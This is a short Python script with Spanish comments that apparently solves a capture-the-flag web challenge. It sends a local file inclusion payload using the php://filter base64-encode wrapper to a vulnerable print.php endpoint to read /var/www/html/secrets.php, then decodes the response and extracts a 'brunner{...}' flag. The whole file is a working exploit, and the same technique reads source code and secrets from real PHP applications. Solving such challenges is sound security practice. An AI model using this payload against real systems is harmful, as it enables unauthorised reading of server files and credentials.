import requests
import base64

# URL del endpoint vulnerable
url = "https://brunsviger-huset-47e6c602eaa6c7d4.challs.brunnerne.xyz/print.php"

# Payload con LFI + php://filter
params = {"file": "php://filter/convert.base64-encode/resource=/var/www/html/secrets.php"}

# Hacemos la petición
response = requests.get(url, params=params)

if response.status_code == 200:
    encoded = response.text.strip()
    print("[+] Base64 recibido:\n", encoded)

    try:
        decoded = base64.b64decode(encoded).decode("utf-8", errors="ignore")
        print("\n[+] Contenido decodificado:\n")
        print(decoded)

        # Si está la flag en el archivo, la mostramos
        if "brunner{" in decoded:
            start = decoded.find("brunner{")
            end = decoded.find("}", start) + 1
            flag = decoded[start:end]
            print("\n FLAG encontrada:", flag)

    except Exception as e:
        print("[-] Error decodificando Base64:", e)
else:
    print("[-] Error al conectar, status code:", response.status_code)

